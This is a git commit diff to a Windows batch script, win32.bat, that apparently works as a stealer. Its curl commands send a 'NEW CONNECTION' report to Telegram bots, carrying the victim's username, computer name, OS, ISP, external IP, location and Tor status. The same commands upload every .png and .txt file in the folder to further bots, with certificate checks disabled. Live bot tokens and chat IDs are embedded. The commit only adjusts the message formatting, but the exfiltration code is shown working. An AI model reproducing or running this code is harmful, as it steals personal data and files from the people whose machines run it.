ad523cba1ad979d5e4c45f56d7d6d27d6379d811
cryptedlumos <90626486+cryptedlumos@users.noreply.github.com>
2021-11-02 10:14:13 +0100

    Update win32.bat

--- win32.bat
+++ win32.bat
@@ -57,12 +57,11 @@ if [%TorStatus%]==[true] (
 for /f "tokens=*" %%A in (
   'curl %proxy% ipinfo.io/ip'
 ) Do set ExtIPTor=%%A
-set "ExtIPTor=(%ExtIPTor%)"
 ) else (
 set "ExtIPTor="
 )
 
-curl.exe %proxy% -F text="NEW CONNECTION: %username%@%computername% [%WinEdition% %OSArchitecture%] [%ISP% (%ExtIP%)] [%City% (%Region%, %Country%)] [Tor is enabled: %TorStatus% %ExtIPTor%] " https://api.telegram.org/bot2069537898:AAEpaEeE32SSpft-gQ97Onau02dbQ6ZY2Ss/sendMessage?chat_id=-1001589929429
+curl.exe %proxy% -F text="NEW CONNECTION: %username%@%computername% [%WinEdition% %OSArchitecture%] [%ISP% (%ExtIP%)] [%City% (%Region%, %Country%)] [Tor is enabled: %TorStatus% (%ExtIPTor%)] " https://api.telegram.org/bot2069537898:AAEpaEeE32SSpft-gQ97Onau02dbQ6ZY2Ss/sendMessage?chat_id=-1001589929429
 for %%# in ("*.png") do curl.exe %proxy% -F document=@"%%~f#" https://api.telegram.org/bot1951761743:AAF3jkN_H27jkxlyUVx-suQChNmEnAS82Ns/sendDocument?chat_id=-1001585587948 -k --insecure
 for %%# in ("*.txt") do curl.exe %proxy% -F document=@"%%~f#" https://api.telegram.org/bot2008957838:AAHp_ojoUjJwh2Y0EDHWyN-pUYRAyiaMPws/sendDocument?chat_id=-1001548046257 -k --insecure
 
